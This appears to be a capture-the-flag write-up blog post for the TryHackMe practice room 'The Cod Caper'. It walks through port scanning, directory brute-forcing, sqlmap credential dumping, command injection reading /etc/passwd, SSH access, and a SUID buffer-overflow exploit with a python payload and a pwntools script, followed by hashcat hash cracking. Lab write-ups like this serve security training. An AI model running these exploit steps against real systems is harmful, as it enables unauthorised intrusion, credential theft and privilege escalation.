---
layout: post
title: "The Cod Caper"
date: 2022-10-08
categories: [Tryhackme, Easy-THM]
tags: [rustscan, gobuster, SQLMap, LinEnum, gdb, hashcat]
image: ../../assets/img/posts/thecodcaper.png 

---

## Description

A guided room taking you through infiltrating and exploiting a Linux system.

|**Room**|[The Cod Caper](https://tryhackme.com/room/thecodcaper)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Paradox](https://tryhackme.com/p/Paradox)|

---

Let's deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.83.110
```

![image](https://user-images.githubusercontent.com/67465230/187013182-5315aa81-088f-4944-afc3-c233eeb348a0.png)

we got 2 open ports. Let's scan them in detail with nmap.

```bash
nmap -sV -sC -p22,80 10.10.83.110 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187013196-118ff2dc-a096-46a0-9ade-4c6296796abe.png)

Scan results describes that port 22 is running ssh service and port 80 is running a webserver. Let's start enumerating port 80.

Visiting http://10.10.83.110,

![image](https://user-images.githubusercontent.com/67465230/187013244-4775e5a4-6e45-411c-875b-9a0d5ce76c9a.png)

we got a default apache server webpage. We can't find anything here. 

Let's brute force directories using gobuster,

```bash
gobuster dir -u http://10.10.83.110 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -o gobuster 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187013470-d9544a82-7aca-4ee9-9bbb-eacb23a4c1a2.png)

we got an administrator.php page.

Visiting http://10.10.83.110/administrator.php,

![image](https://user-images.githubusercontent.com/67465230/187013475-17642a63-691f-4dff-b8e6-5b4ce16fea09.png)

and we can see the login page. Since we don't have credentials, we can try to dump them using SQLMap.

```bash
sqlmap -u http://10.10.83.110/administrator.php --forms --dump
```

![image](https://user-images.githubusercontent.com/67465230/194691571-d77d2234-39f1-4ddd-bf53-57274835a889.png)

we got username and password. 

Let's try to login as administrator,

![image](https://user-images.githubusercontent.com/67465230/187013483-06f6c20a-1cd9-4bec-8b2d-80d0a7c30f18.png)

This is the box where we can run commands. **Command Injection**.

Listing directory content, `ls`

![image](https://user-images.githubusercontent.com/67465230/187013492-9e42fc16-cc04-4dc0-9261-5f8aae0fc91b.png)

we got some files. 

If we can run commands and server gives output back to us, then we can also read sensitive files. 

So I tried to read /etc/passwd file,

```bash
cat /etc/passwd
```

![image](https://user-images.githubusercontent.com/67465230/187013501-e03cd373-5f78-4580-8213-0e687fcfd7a4.png)

and there I got this user **pingu**. 

Now since we know the username, then why don't we attempt to find the password on whole system,

```bash
find / -name pass -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187013509-1347931c-7ab4-467e-bafe-c7f5ee128a3f.png)

our "pass" string resides in **/var/hidden/pass** file. 

Looking at the content of the /var/hidden/pass file,

![image](https://user-images.githubusercontent.com/67465230/194691795-04564ff4-8daa-4a56-90e2-f0ae7389627a.png)

We obtain the password.

Now, we can ssh into machine using credentials we obtain before,

```bash
ssh pingu@10.10.83.110
```

![image](https://user-images.githubusercontent.com/67465230/187013526-97fdaf34-ed0e-4c24-9307-0ac5fda8fab4.png)

and we got in. 

Now, since this machine don't have LinEnum script, I transferred by hosting the server, `python3 -m http.server` and then transfer file using `wget`.

Now that we got file, make it executable and running it,

```bash
chmod +x LinEnum.sh
/LinEnum.sh
```

after scrolling down to SUID section, I found that there is a file /ope/secret/root which has SUID bit set on it. This file is and executable.

Start the suid file with gdb,

```bash
gdb /opt/secret/root
```

![image](https://user-images.githubusercontent.com/67465230/187596056-4e338f89-4ac7-4fc0-b64d-7c89ab4f3e42.png)

The following command tells you exactly how many characters you need to provide in order to override the instruction pointer,

```bash
cyclic -l 0x6161616c
```

![image](https://user-images.githubusercontent.com/67465230/187013540-333d9f80-6143-4d27-b76e-9003d17bf20a.png)

Quit the gdb shell, and in the system use this command,

```bash
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | ./root
```

![image](https://user-images.githubusercontent.com/67465230/194691825-9fb5564a-6c9c-4438-9594-e04cc4154d4c.png)

We are printing 44 times the letter A to fill the buffer, and then we provide the string "\xcb\x84\x04\x08" which represents the shell function, therefore once the get_input() function ends instead of returning to the main() it will go to shell(). 

In this task we will achieve the same result but with pwntools.  
The main difference is that we get the shell() starting point from ‘elf.symbols.shell’.

```bash
from pwn import *  
proc = process('/opt/secret/root')  
elf = ELF('/opt/secret/root')  
shell_func = elf.symbols.shell  
payload = fit({  
44: shell_func # this adds the value of shell_func after 44 characters  
})  
proc.sendline(payload)  
proc.interactive()
```

Save the program into a .py file and run it.

![image](https://user-images.githubusercontent.com/67465230/194691880-93d7e942-38bc-4b77-be0a-2fb2b1a0551a.png)

Now, we can crack the hash with hashcat.

```bash
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt --force
```

![image](https://user-images.githubusercontent.com/67465230/194691868-8b78a82a-d00d-415e-b224-f3d9095430fe.png)

And there we have our root user hash.